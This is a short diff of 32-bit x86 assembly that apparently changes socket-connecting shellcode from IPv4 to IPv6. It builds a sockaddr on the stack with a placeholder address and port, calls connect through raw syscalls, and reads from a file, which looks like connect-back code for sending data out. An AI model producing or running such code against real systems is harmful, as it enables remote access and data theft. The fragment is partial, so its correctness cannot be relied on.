@@ -6,15 +6,27 @@ socket:
 	pushl %edx
 	incl  %edx
 	pushl %edx
-	incl  %edx
-	pushl %edx
-	pushl $0x0100007f   # ipaddr 127.0.0.1
+
+	pushl $0x1c  #AF_INET6
+	xorl %ecx, %ecx
+	movb $0x60, %cl
+	pushl %ecx # interface id
+	
 	int  $0x80
 
 connect:
-	pushl $0xbfbf0210   # port number
+	pushl $0x11111114
+	pushl $0x11111113
+	pushl $0x11111112
+	pushl $0x11111111
+
+	xorl %ecx, %ecx
+	pushl %ecx # flowinfo
+	
+	pushl $0xbfbf1cbc # port number
+
 	movl  %esp, %ecx
-	pushl  $0x10 # size
+	pushl $0x1c # size
 	pushl %ecx # sockaddr *data
 	pushl %eax # socket
 	pushl %ecx 
@@ -31,7 +43,7 @@ read:
 	sub $0x80, %esp
 
         xorl %eax, %eax
-	movb $0xaa, %al
+	movw $0xaaaa, %ax
 	push %eax        ## 32 bytes
 	push %esi        ## buff
 	movl %ebx, %eax  ## read from the file
